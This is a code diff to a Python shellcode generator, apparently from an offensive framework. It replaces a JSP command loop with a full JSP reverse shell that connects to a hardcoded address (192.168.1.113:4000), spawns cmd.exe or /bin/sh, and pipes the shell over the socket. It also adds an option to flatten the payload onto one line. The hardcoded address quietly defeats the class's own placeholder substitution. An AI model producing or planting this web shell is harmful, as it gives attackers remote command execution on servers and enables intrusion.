@@ -15,7 +15,7 @@ class JavaShellcodes(Shellcode):
         self.path_to_jar = ""
         return
 
-    def get_jsp(self):
+    def get_jsp(self, inline=False):
         """ Function to get java(jsp) shellcode """
 
         if not self.CONNECTBACK_IP or not self.CONNECTBACK_PORT:
@@ -24,36 +24,52 @@ class JavaShellcodes(Shellcode):
 
         javacode = ""
         javacode += """
-<%@ page import="java.lang.*, java.util.*, java.io.*, java.net.*" %>
-<%
-    for (;;) {
-        Socket socket = new Socket("LOCALHOST", LOCALPORT);
+<%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>
+<%class StreamConnector extends Thread {
+	InputStream is;
+	OutputStream os;
+	StreamConnector( InputStream is, OutputStream os ) {
+		this.is = is;
+		this.os = os;
+	}
+	public void run() {
+		BufferedReader in = null;
+		BufferedWriter out = null;
+		try {
+			in = new BufferedReader( new InputStreamReader( this.is ) );
+			out = new BufferedWriter( new OutputStreamWriter( this.os ) );
+			char buffer[] = new char[8192];
+			int length;
+			while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) {
+				out.write( buffer, 0, length ); out.flush();
+			}
+		} catch( Exception e ){
 
-        InputStream inSocket = socket.getInputStream();
-        BufferedReader s_in = new BufferedReader(new InputStreamReader(inSocket));
+		}
+		try {
+			if( in != null ) in.close();
+			if( out != null ) out.close();
+		} catch( Exception e ){}
+	}
+}
+try {
+	String OS = System.getProperty("os.name").toLowerCase();
+	Socket socket = new Socket( "192.168.1.113", 4000 );
+	String command = "cmd.exe";
+	if (OS.indexOf("win") < 0)
+		command = "/bin/sh";
+	Process process = Runtime.getRuntime().exec(command);
+	(new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();
+	(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
+} catch( Exception e ) {
 
-        OutputStream outSocket = socket.getOutputStream();
-
-        char buffer[] = new char[8192];
-        int length = s_in.read( buffer, 0, buffer.length );
-        String cmd = String.valueOf(buffer,0, length);
-
-        Process p = new ProcessBuilder("cmd.exe", "/C", cmd).redirectErrorStream(true).start();
-        InputStream is = p.getInputStream();
-        BufferedReader br = new BufferedReader(new InputStreamReader(is));
-        String in;
-        String all = "";
-        while ((in = br.readLine()) != null) {
-            all = all + in + "\\n\\r";
-        }
-        outSocket.write(all.getBytes());
-        socket.close();
-    }
+}
 %>"""
 
         javacode = javacode.replace("LOCALHOST", str(self.CONNECTBACK_IP))
         javacode = javacode.replace("LOCALPORT", str(self.CONNECTBACK_PORT))
-
+        if inline:
+            javacode = self.make_inline(javacode)
         return javacode
 
     def get_jar(self, filename=""):
@@ -76,3 +92,9 @@ class JavaShellcodes(Shellcode):
         if self.type == Constants.JavaShellcodeType.JAR:
             return self.get_jar()
         return self.get_jsp()
+
+    def make_inline(self, payload):
+        payload = payload.replace('\t',' ')
+        payload = payload.replace('\r',' ')
+        payload = payload.replace('\n',' ')
+        return payload
